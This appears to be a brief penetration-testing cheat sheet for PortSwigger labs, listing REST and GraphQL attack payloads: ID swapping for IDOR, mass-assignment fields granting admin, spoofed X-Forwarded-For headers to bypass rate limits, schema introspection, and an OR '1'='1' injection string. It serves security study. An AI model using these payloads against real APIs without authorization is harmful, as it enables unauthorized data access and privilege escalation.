# API Security - Attack Techniques

## REST API Vulnerabilities

### IDOR (Insecure Direct Object Reference)
```
GET /api/users/1 → GET /api/users/2
GET /api/orders/100 → GET /api/orders/101
```

### Mass Assignment
```json
// Add extra fields to request
POST /api/user
{"name": "test", "role": "admin", "isAdmin": true}
```

### Broken Function Level Authorization
```
# Access admin endpoints with regular user token
GET /api/admin/users
GET /api/admin/config
```

### Rate Limiting Bypass
```
# Add headers to bypass rate limiting
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
```

## GraphQL Vulnerabilities

### Introspection
```graphql
{__schema {types {name fields {name}}}}
```

### IDOR
```graphql
{user(id: 1) {email password}}
```

### Injection
```graphql
{user(username: "admin' OR '1'='1") {id}}
```

## PortSwigger Lab Approach
1. Discover API endpoints
2. Test IDOR by changing IDs
3. Test mass assignment by adding fields
4. Test rate limiting bypass
5. Check for GraphQL introspection
